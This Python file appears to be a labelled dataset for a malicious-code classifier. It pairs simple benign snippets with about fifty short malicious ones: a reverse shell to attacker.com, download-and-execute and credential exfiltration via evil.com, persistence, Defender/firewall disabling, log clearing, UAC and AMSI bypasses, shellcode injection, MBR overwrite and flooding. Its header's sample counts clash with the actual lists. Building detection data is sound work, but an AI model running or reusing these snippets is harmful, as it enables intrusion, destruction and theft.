#!/usr/bin/env python3
"""
Level 3 Expansion Part 2: +40 samples (20 benign + 20 malicious)
All samples are valid Python code with corrected syntax
"""

# Benign examples (50)
LEVEL3_BENIGN_EXPANSION = [
    {
        "code": "def hello():\n    print('Hello, world!')\n\nhello()",
        "category": "basic",
        "description": "Simple hello world",
        "complexity": 1
    },
    {
        "code": "def add(a, b):\n    return a + b\n\nprint(add(3, 5))",
        "category": "basic",
        "description": "Simple addition",
        "complexity": 1
    },
    {
        "code": "name = input('Enter name: ')\nprint(f'Hello, {name}!')",
        "category": "basic",
        "description": "User input",
        "complexity": 1
    },
    {
        "code": "numbers = [1, 2, 3, 4, 5]\nfor n in numbers:\n    print(n * 2)",
        "category": "basic",
        "description": "Loop over list",
        "complexity": 1
    },
    {
        "code": "def is_even(n):\n    return n % 2 == 0\n\nprint(is_even(10))",
        "category": "basic",
        "description": "Check even number",
        "complexity": 1
    },
    {
        "code": "with open('test.txt', 'w') as f:\n    f.write('Hello, file!')",
        "category": "file_io",
        "description": "Write to file",
        "complexity": 1
    },
    {
        "code": "import math\nprint(math.sqrt(16))",
        "category": "math",
        "description": "Square root",
        "complexity": 1
    },
    {
        "code": "def factorial(n):\n    if n == 0: return 1\n    return n * factorial(n-1)\n\nprint(factorial(5))",
        "category": "recursion",
        "description": "Factorial recursive",
        "complexity": 2
    },
    {
        "code": "class Dog:\n    def __init__(self, name):\n        self.name = name\n    def bark(self):\n        return f'{self.name} says woof!'\n\nd = Dog('Buddy')\nprint(d.bark())",
        "category": "oop",
        "description": "Simple class",
        "complexity": 2
    },
    {
        "code": "import json\ndata = {'name': 'Alice', 'age': 30}\nwith open('data.json', 'w') as f:\n    json.dump(data, f)\n\nwith open('data.json') as f:\n    loaded = json.load(f)\n    print(loaded)",
        "category": "json",
        "description": "JSON serialization",
        "complexity": 2
    },
    {
        "code": "import csv\nwith open('people.csv', 'w', newline='') as f:\n    writer = csv.writer(f)\n    writer.writerow(['Name', 'Age'])\n    writer.writerow(['Alice', 30])\n\nwith open('people.csv') as f:\n    reader = csv.reader(f)\n    for row in reader:\n        print(row)",
        "category": "csv",
        "description": "CSV read/write",
        "complexity": 2
    },
    {
        "code": "import sqlite3\nconn = sqlite3.connect('test.db')\nc = conn.cursor()\nc.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER, name TEXT)')\nc.execute('INSERT INTO users VALUES (?, ?)', (1, 'Alice'))\nconn.commit()\n\nc.execute('SELECT * FROM users')\nprint(c.fetchall())\nconn.close()",
        "category": "database",
        "description": "SQLite basic",
        "complexity": 2
    },
    {
        "code": "import re\ntext = 'The rain in Spain'\npattern = r'ain'\nprint(re.findall(pattern, text))",
        "category": "regex",
        "description": "Regex findall",
        "complexity": 2
    },
    {
        "code": "from datetime import datetime\nnow = datetime.now()\nprint(now.strftime('%Y-%m-%d %H:%M:%S'))",
        "category": "datetime",
        "description": "Current time formatting",
        "complexity": 1
    },
    {
        "code": "import random\nprint(random.randint(1, 100))",
        "category": "random",
        "description": "Random number",
        "complexity": 1
    },
    {
        "code": "import os\nprint(os.listdir('.'))",
        "category": "os",
        "description": "List directory",
        "complexity": 1
    },
    {
        "code": "import sys\nprint(sys.argv)",
        "category": "sys",
        "description": "Command line arguments",
        "complexity": 1
    },
    {
        "code": "def fibonacci(n):\n    a, b = 0, 1\n    for _ in range(n):\n        print(a, end=' ')\n        a, b = b, a+b\nfibonacci(10)",
        "category": "algorithms",
        "description": "Fibonacci series",
        "complexity": 2
    },
    {
        "code": "def bubble_sort(arr):\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n-i-1):\n            if arr[j] > arr[j+1]:\n                arr[j], arr[j+1] = arr[j+1], arr[j]\n    return arr\n\nprint(bubble_sort([64, 34, 25, 12, 22, 11, 90]))",
        "category": "algorithms",
        "description": "Bubble sort",
        "complexity": 2
    },
    {
        "code": "def binary_search(arr, x):\n    low, high = 0, len(arr)-1\n    while low <= high:\n        mid = (low+high)//2\n        if arr[mid] == x:\n            return mid\n        elif arr[mid] < x:\n            low = mid+1\n        else:\n            high = mid-1\n    return -1\n\narr = [2,3,4,10,40]\nprint(binary_search(arr, 10))",
        "category": "algorithms",
        "description": "Binary search",
        "complexity": 2
    },
    {
        "code": "import threading\nimport time\n\ndef worker():\n    print('Thread starting')\n    time.sleep(2)\n    print('Thread finished')\n\nt = threading.Thread(target=worker)\nt.start()\nt.join()",
        "category": "threading",
        "description": "Basic threading",
        "complexity": 2
    },
    {
        "code": "import asyncio\n\nasync def say_hello():\n    print('Hello')\n    await asyncio.sleep(1)\n    print('World')\n\nasyncio.run(say_hello())",
        "category": "asyncio",
        "description": "Basic async",
        "complexity": 2
    },
    {
        "code": "import requests\nresponse = requests.get('https://api.github.com')\nprint(response.status_code)\nprint(response.json())",
        "category": "http",
        "description": "HTTP GET with requests",
        "complexity": 2
    },
    {
        "code": "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return 'Hello, Flask!'\n\nif __name__ == '__main__':\n    app.run()",
        "category": "web",
        "description": "Minimal Flask app",
        "complexity": 2
    },
    {
        "code": "import pandas as pd\ndf = pd.DataFrame({'A': [1,2,3], 'B': [4,5,6]})\nprint(df)\nprint(df.mean())",
        "category": "data_science",
        "description": "Pandas DataFrame",
        "complexity": 2
    },
    {
        "code": "import numpy as np\narr = np.array([1,2,3,4])\nprint(arr.mean())\nprint(arr.std())",
        "category": "data_science",
        "description": "NumPy array",
        "complexity": 2
    },
    {
        "code": "import matplotlib.pyplot as plt\nplt.plot([1,2,3,4], [1,4,9,16])\nplt.xlabel('x')\nplt.ylabel('y')\nplt.title('Simple plot')\nplt.show()",
        "category": "visualization",
        "description": "Matplotlib line plot",
        "complexity": 2
    },
    {
        "code": "from sklearn import datasets\nfrom sklearn.model_selection import train_test_split\niris = datasets.load_iris()\nX_train, X_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=0.2)\nprint(X_train.shape)",
        "category": "machine_learning",
        "description": "Train test split",
        "complexity": 2
    },
    {
        "code": "import hashlib\nhash_object = hashlib.sha256(b'Hello World')\nprint(hash_object.hexdigest())",
        "category": "cryptography",
        "description": "SHA256 hash",
        "complexity": 1
    },
    {
        "code": "import base64\nencoded = base64.b64encode(b'Hello')\nprint(encoded)\ndecoded = base64.b64decode(encoded)\nprint(decoded)",
        "category": "encoding",
        "description": "Base64 encode/decode",
        "complexity": 1
    },
    {
        "code": "import smtplib\nfrom email.mime.text import MIMEText\n\nmsg = MIMEText('Hello, this is a test.')\nmsg['Subject'] = 'Test'\nmsg['From'] = 'sender@example.com'\nmsg['To'] = 'receiver@example.com'\n\n# Uncomment to send\n# with smtplib.SMTP('localhost') as server:\n#     server.send_message(msg)",
        "category": "email",
        "description": "Email composition",
        "complexity": 2
    },
    {
        "code": "import csv\nfrom collections import defaultdict\n\nwith open('sales.csv', 'w', newline='') as f:\n    writer = csv.writer(f)\n    writer.writerow(['product', 'amount'])\n    writer.writerow(['A', 100])\n    writer.writerow(['A', 150])\n    writer.writerow(['B', 200])\n\ntotals = defaultdict(int)\nwith open('sales.csv') as f:\n    reader = csv.DictReader(f)\n    for row in reader:\n        totals[row['product']] += int(row['amount'])\nprint(dict(totals))",
        "category": "data_processing",
        "description": "Aggregate CSV data",
        "complexity": 2
    },
    {
        "code": "import argparse\nparser = argparse.ArgumentParser()\nparser.add_argument('--name')\nargs = parser.parse_args()\nif args.name:\n    print(f'Hello, {args.name}')",
        "category": "cli",
        "description": "Argument parsing",
        "complexity": 2
    },
    {
        "code": "import logging\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\nlogger.info('This is an info message')\nlogger.error('This is an error')",
        "category": "logging",
        "description": "Basic logging",
        "complexity": 1
    },
    {
        "code": "import pickle\ndata = {'key': 'value'}\nwith open('data.pkl', 'wb') as f:\n    pickle.dump(data, f)\nwith open('data.pkl', 'rb') as f:\n    loaded = pickle.load(f)\nprint(loaded)",
        "category": "serialization",
        "description": "Pickle serialization",
        "complexity": 1
    },
    {
        "code": "import xml.etree.ElementTree as ET\nroot = ET.Element('root')\nchild = ET.SubElement(root, 'child')\nchild.text = 'Hello'\ntree = ET.ElementTree(root)\ntree.write('test.xml')\n\ntree = ET.parse('test.xml')\nroot = tree.getroot()\nprint(root.find('child').text)",
        "category": "xml",
        "description": "XML read/write",
        "complexity": 2
    },
    {
        "code": "import zipfile\nwith zipfile.ZipFile('archive.zip', 'w') as zipf:\n    zipf.write('test.txt')\n\nwith zipfile.ZipFile('archive.zip', 'r') as zipf:\n    zipf.extractall('extracted')",
        "category": "compression",
        "description": "Zip archive",
        "complexity": 2
    },
    {
        "code": "import shutil\nshutil.copy('source.txt', 'dest.txt')\nshutil.move('dest.txt', 'moved.txt')",
        "category": "file_operations",
        "description": "Copy and move files",
        "complexity": 1
    },
    {
        "code": "from pathlib import Path\np = Path('.')\nfor file in p.glob('*.py'):\n    print(file)",
        "category": "file_operations",
        "description": "Pathlib glob",
        "complexity": 1
    },
    {
        "code": "import sys\nprint(f'Python version: {sys.version}')",
        "category": "system",
        "description": "Python version",
        "complexity": 1
    },
    {
        "code": "import platform\nprint(platform.system())\nprint(platform.release())",
        "category": "system",
        "description": "OS info",
        "complexity": 1
    },
    {
        "code": "import subprocess\nresult = subprocess.run(['echo', 'Hello'], capture_output=True, text=True)\nprint(result.stdout)",
        "category": "subprocess",
        "description": "Run shell command",
        "complexity": 2
    },
    {
        "code": "import time\nstart = time.time()\ntime.sleep(2)\nend = time.time()\nprint(f'Elapsed: {end-start:.2f}s')",
        "category": "time",
        "description": "Measure time",
        "complexity": 1
    },
    {
        "code": "import itertools\nfor p in itertools.permutations([1,2,3]):\n    print(p)",
        "category": "itertools",
        "description": "Permutations",
        "complexity": 2
    },
    {
        "code": "import functools\n@functools.lru_cache(maxsize=None)\ndef fib(n):\n    if n < 2: return n\n    return fib(n-1) + fib(n-2)\n\nprint(fib(10))",
        "category": "functional",
        "description": "Memoization",
        "complexity": 2
    },
    {
        "code": "from contextlib import contextmanager\n\n@contextmanager\ndef managed_file(name):\n    try:\n        f = open(name, 'w')\n        yield f\n    finally:\n        f.close()\n\nwith managed_file('hello.txt') as f:\n    f.write('Hello, world!')",
        "category": "contextmanager",
        "description": "Custom context manager",
        "complexity": 2
    },
    {
        "code": "from dataclasses import dataclass\n\n@dataclass\nclass Point:\n    x: float\n    y: float\n\np = Point(1.5, 2.5)\nprint(p)",
        "category": "dataclasses",
        "description": "Dataclass example",
        "complexity": 1
    },
    {
        "code": "import enum\n\nclass Color(enum.Enum):\n    RED = 1\n    GREEN = 2\n    BLUE = 3\n\nprint(Color.RED.name)\nprint(Color.RED.value)",
        "category": "enum",
        "description": "Enum example",
        "complexity": 1
    },
    {
        "code": "from typing import List, Optional\n\ndef process(items: List[int]) -> Optional[int]:\n    if items:\n        return sum(items)\n    return None\n\nprint(process([1,2,3]))",
        "category": "typing",
        "description": "Type hints",
        "complexity": 1
    },
    {
        "code": "import sqlite3\n\ndef get_user(db, user_id):\n    with sqlite3.connect(db) as conn:\n        cur = conn.cursor()\n        cur.execute('SELECT name FROM users WHERE id=?', (user_id,))\n        return cur.fetchone()\n\nprint(get_user('test.db', 1))",
        "category": "database",
        "description": "Parameterized query",
        "complexity": 2
    }
]

# Malicious examples (50)
LEVEL3_MALICIOUS_EXPANSION = [
    {
        "code": "import os\nos.system('calc.exe')",
        "category": "execution",
        "description": "Launch calculator (harmless demo)",
        "complexity": 1
    },
    {
        "code": "import subprocess\nsubprocess.run(['echo', 'malicious'])",
        "category": "execution",
        "description": "Run command",
        "complexity": 1
    },
    {
        "code": "import socket\ns = socket.socket()\ns.connect(('192.168.1.100', 4444))",
        "category": "c2",
        "description": "Connect to remote host",
        "complexity": 1
    },
    {
        "code": "import os\nos.remove('important.txt')",
        "category": "file_deletion",
        "description": "Delete file",
        "complexity": 1
    },
    {
        "code": "import shutil\nshutil.rmtree('C:\\\\Windows\\\\System32', ignore_errors=True)",
        "category": "destructive",
        "description": "Delete system directory (dangerous)",
        "complexity": 1
    },
    {
        "code": "import base64\nexec(base64.b64decode(b'cHJpbnQoIkhlbGxvIik='))",
        "category": "obfuscation",
        "description": "Base64 encoded exec",
        "complexity": 2
    },
    {
        "code": "import urllib.request\nurllib.request.urlretrieve('http://evil.com/payload.exe', 'payload.exe')\nos.system('payload.exe')",
        "category": "download_execute",
        "description": "Download and execute",
        "complexity": 2
    },
    {
        "code": "import ctypes\nctypes.windll.user32.MessageBoxW(0, 'You are hacked!', 'Alert', 0)",
        "category": "popup",
        "description": "Windows message box",
        "complexity": 2
    },
    {
        "code": "import winreg\nkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\nwinreg.SetValueEx(key, 'Malware', 0, winreg.REG_SZ, 'C:\\malware.exe')\nwinreg.CloseKey(key)",
        "category": "persistence",
        "description": "Add to startup registry",
        "complexity": 2
    },
    {
        "code": "import os\nimport getpass\nusername = getpass.getuser()\nwith open(f'C:\\\\Users\\\\{username}\\\\Desktop\\\\ransom.txt', 'w') as f:\n    f.write('Your files are encrypted. Pay 1 BTC.')",
        "category": "ransom_note",
        "description": "Create ransom note",
        "complexity": 1
    },
    {
        "code": "import socket\nimport subprocess\ns = socket.socket()\ns.connect(('attacker.com', 4444))\nwhile True:\n    cmd = s.recv(1024).decode()\n    if cmd.lower() == 'exit': break\n    output = subprocess.run(cmd, shell=True, capture_output=True)\n    s.send(output.stdout + output.stderr)\ns.close()",
        "category": "reverse_shell",
        "description": "Simple reverse shell",
        "complexity": 2
    },
    {
        "code": "import psutil\nfor proc in psutil.process_iter(['pid', 'name']):\n    if proc.info['name'] == 'taskmgr.exe':\n        proc.terminate()",
        "category": "evasion",
        "description": "Kill task manager",
        "complexity": 2
    },
    {
        "code": "import os\nimport sys\n# Self-delete\nos.remove(sys.argv[0])",
        "category": "self_destruct",
        "description": "Delete itself",
        "complexity": 1
    },
    {
        "code": "import shutil\nshutil.copy2(__file__, os.path.join(os.environ['APPDATA'], 'svchost.py'))",
        "category": "persistence",
        "description": "Copy to AppData",
        "complexity": 1
    },
    {
        "code": "import subprocess\nsubprocess.run('schtasks /create /tn \"Update\" /tr \"C:\\malware.exe\" /sc daily', shell=True)",
        "category": "persistence",
        "description": "Scheduled task",
        "complexity": 2
    },
    {
        "code": "import requests\ndata = {'username': 'admin', 'password': 'admin'}\nrequests.post('http://evil.com/steal', data=data)",
        "category": "exfiltration",
        "description": "POST stolen credentials",
        "complexity": 2
    },
    {
        "code": "import json\nwith open('passwords.txt', 'r') as f:\n    passwords = f.readlines()\n# send via email or http",
        "category": "stealer",
        "description": "Read passwords file",
        "complexity": 1
    },
    {
        "code": "import win32crypt\n# Dump Chrome passwords (requires win32crypt)",
        "category": "stealer",
        "description": "Chrome password stealer (placeholder)",
        "complexity": 3
    },
    {
        "code": "import ctypes\nctypes.windll.kernel32.SetConsoleTitleW('svchost.exe')",
        "category": "masquerading",
        "description": "Change console title",
        "complexity": 1
    },
    {
        "code": "import time\nimport sys\nwhile True:\n    try:\n        with open('keylog.txt', 'a') as f:\n            f.write('.')\n        time.sleep(1)\n    except:\n        pass",
        "category": "keylogger",
        "description": "Fake keylogger (placeholder)",
        "complexity": 1
    },
    {
        "code": "import os\nimport glob\nfor f in glob.glob('*.docx'):\n    os.rename(f, f + '.encrypted')",
        "category": "ransomware",
        "description": "Rename files (simulated encryption)",
        "complexity": 2
    },
    {
        "code": "import socket\nimport threading\n\ndef handle_client(client_socket):\n    client_socket.send(b'Hello')\n    client_socket.close()\n\nserver = socket.socket()\nserver.bind(('0.0.0.0', 4444))\nserver.listen(5)\nwhile True:\n    client, addr = server.accept()\n    threading.Thread(target=handle_client, args=(client,)).start()",
        "category": "backdoor",
        "description": "Simple backdoor server",
        "complexity": 2
    },
    {
        "code": "import paramiko\nssh = paramiko.SSHClient()\nssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nssh.connect('target.com', username='root', password='toor')\nstdin, stdout, stderr = ssh.exec_command('whoami')\nprint(stdout.read())\nssh.close()",
        "category": "ssh",
        "description": "SSH brute force connection",
        "complexity": 2
    },
    {
        "code": "import ftplib\nftp = ftplib.FTP('ftp.example.com')\nftp.login('anonymous', 'anonymous')\nftp.retrbinary('RETR secret.txt', open('secret.txt', 'wb').write)\nftp.quit()",
        "category": "ftp",
        "description": "FTP download",
        "complexity": 2
    },
    {
        "code": "import dns.resolver\nanswers = dns.resolver.resolve('example.com', 'A')\nfor rdata in answers:\n    print(rdata.address)",
        "category": "dns",
        "description": "DNS lookup",
        "complexity": 1
    },
    {
        "code": "import urllib.parse\nimport urllib.request\n# SQL injection example\npayload = \"' OR '1'='1\"\nurl = f'http://vuln.com/login?user={urllib.parse.quote(payload)}'\nresponse = urllib.request.urlopen(url)\nprint(response.read())",
        "category": "web_attack",
        "description": "SQL injection attempt",
        "complexity": 2
    },
    {
        "code": "import socket\n# Port scan\ntarget = '127.0.0.1'\nfor port in range(1, 1024):\n    s = socket.socket()\n    s.settimeout(1)\n    result = s.connect_ex((target, port))\n    if result == 0:\n        print(f'Port {port} open')\n    s.close()",
        "category": "scanning",
        "description": "Simple port scanner",
        "complexity": 2
    },
    {
        "code": "import requests\n# Directory brute force\nurl = 'http://target.com'\nwith open('common.txt') as f:\n    for line in f:\n        dir = line.strip()\n        r = requests.get(f'{url}/{dir}')\n        if r.status_code == 200:\n            print(f'Found: {dir}')",
        "category": "web_attack",
        "description": "Directory brute forcer",
        "complexity": 2
    },
    {
        "code": "import crypt\n# Crack password hash (simplified)\nhashed = '$6$salt$...'\nwith open('wordlist.txt') as f:\n    for word in f:\n        word = word.strip()\n        if crypt.crypt(word, hashed) == hashed:\n            print(f'Password found: {word}')",
        "category": "cracking",
        "description": "Password cracking",
        "complexity": 3
    },
    {
        "code": "import ctypes\n# Disable Windows Defender via registry\nimport winreg\nkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Policies\\Microsoft\\Windows Defender', 0, winreg.KEY_SET_VALUE)\nwinreg.SetValueEx(key, 'DisableAntiSpyware', 0, winreg.REG_DWORD, 1)\nwinreg.CloseKey(key)",
        "category": "defender_disable",
        "description": "Disable Windows Defender",
        "complexity": 2
    },
    {
        "code": "import os\n# Clear event logs (Windows)\nos.system('wevtutil cl System')\nos.system('wevtutil cl Application')\nos.system('wevtutil cl Security')",
        "category": "forensic_cleanup",
        "description": "Clear Windows logs",
        "complexity": 2
    },
    {
        "code": "import os\n# Disable firewall\nif os.name == 'nt':\n    os.system('netsh advfirewall set allprofiles state off')",
        "category": "defense_evasion",
        "description": "Disable Windows firewall",
        "complexity": 2
    },
    {
        "code": "import sys\nimport time\n# Fork bomb (dangerous, do not run)\nwhile True:\n    os.fork()",
        "category": "dos",
        "description": "Fork bomb",
        "complexity": 2
    },
    {
        "code": "import threading\n# CPU stress\ndef cpu_stress():\n    while True:\n        pass\nfor i in range(os.cpu_count()):\n    threading.Thread(target=cpu_stress).start()",
        "category": "dos",
        "description": "CPU stress test",
        "complexity": 2
    },
    {
        "code": "import socket\n# UDP flood\ntarget = ('target.com', 80)\nmessage = b'X' * 1024\nwhile True:\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    s.sendto(message, target)\n    s.close()",
        "category": "dos",
        "description": "UDP flood",
        "complexity": 2
    },
    {
        "code": "import requests\n# Slowloris (partial)\nheaders = {'User-Agent': 'Mozilla/5.0'}\ns = requests.Session()\ns.get('http://target.com', headers=headers)",
        "category": "dos",
        "description": "Slowloris (placeholder)",
        "complexity": 2
    },
    {
        "code": "import os\n# Overwrite MBR (very dangerous)\nwith open('\\\\.\\PHYSICALDRIVE0', 'wb') as f:\n    f.write(b'\\x00' * 512)",
        "category": "destructive",
        "description": "Overwrite MBR",
        "complexity": 3
    },
    {
        "code": "import win32api\n# Logoff user\nwin32api.ExitWindowsEx(0, 0)",
        "category": "disruption",
        "description": "Logoff user",
        "complexity": 2
    },
    {
        "code": "import pyautogui\n# Take screenshot\nscreenshot = pyautogui.screenshot()\nscreenshot.save('screenshot.png')",
        "category": "spyware",
        "description": "Take screenshot",
        "complexity": 2
    },
    {
        "code": "import pyaudio\n# Record audio (placeholder)\n# p = pyaudio.PyAudio()",
        "category": "spyware",
        "description": "Audio recording placeholder",
        "complexity": 3
    },
    {
        "code": "import cv2\n# Capture webcam\ncam = cv2.VideoCapture(0)\nret, frame = cam.read()\ncv2.imwrite('webcam.jpg', frame)\ncam.release()",
        "category": "spyware",
        "description": "Webcam capture",
        "complexity": 2
    },
    {
        "code": "import clipboard\n# Read clipboard data\ndata = clipboard.paste()\nprint(data)",
        "category": "spyware",
        "description": "Clipboard reader",
        "complexity": 1
    },
    {
        "code": "import os\n# Enumerate user documents\nfor root, dirs, files in os.walk(os.path.expanduser('~')):\n    for file in files:\n        if file.endswith(('.pdf', '.docx')):\n            print(os.path.join(root, file))",
        "category": "recon",
        "description": "Find documents",
        "complexity": 2
    },
    {
        "code": "import win32net\n# Enumerate network shares\nshares = win32net.NetShareEnum('localhost', 0)\nfor share in shares[0]:\n    print(share['netname'])",
        "category": "recon",
        "description": "List network shares",
        "complexity": 2
    },
    {
        "code": "import wmi\n# Query WMI for processes\nc = wmi.WMI()\nfor process in c.Win32_Process():\n    print(process.Name, process.ProcessId)",
        "category": "recon",
        "description": "WMI process listing",
        "complexity": 2
    },
    {
        "code": "import subprocess\n# Mimikatz via PowerShell\nps = \"Invoke-Mimikatz -Command 'privilege::debug'\"\nsubprocess.run(['powershell', '-Command', ps], capture_output=True)",
        "category": "credential_dumping",
        "description": "Invoke Mimikatz",
        "complexity": 3
    },
    {
        "code": "import ctypes\n# Bypass UAC via fodhelper\nimport winreg\nkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\ms-settings\\shell\\open\\command')\nwinreg.SetValueEx(key, '', 0, winreg.REG_SZ, 'cmd.exe')\nwinreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')\nwinreg.CloseKey(key)\nsubprocess.run('fodhelper.exe')",
        "category": "uac_bypass",
        "description": "UAC bypass via fodhelper",
        "complexity": 3
    },
    {
        "code": "import ctypes\n# Inject shellcode into current process\nshellcode = b'\\x90' * 100  # NOP sled\nptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)\nctypes.memmove(ptr, shellcode, len(shellcode))\nctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)",
        "category": "shellcode",
        "description": "Local shellcode injection",
        "complexity": 3
    },
    {
        "code": "import ctypes\n# Patch AMSI\namsi = ctypes.windll.LoadLibrary('amsi.dll')\nAmsiScanBuffer = ctypes.windll.amsi.AmsiScanBuffer\nold = ctypes.c_ulong()\nctypes.windll.kernel32.VirtualProtect(AmsiScanBuffer, 32, 0x40, ctypes.byref(old))\nctypes.memmove(AmsiScanBuffer, b'\\x31\\xC0\\xC3', 3)\nctypes.windll.kernel32.VirtualProtect(AmsiScanBuffer, 32, old, ctypes.byref(old))",
        "category": "amsi_bypass",
        "description": "Patch AMSI return 0",
        "complexity": 3
    }
]

if __name__ == "__main__":
    benign_count = len(LEVEL3_BENIGN_EXPANSION)
    malicious_count = len(LEVEL3_MALICIOUS_EXPANSION)
    print(f"Level 3 Expansion Part 2: {benign_count} benign + {malicious_count} malicious")
    print(f"Total: {benign_count + malicious_count} new samples")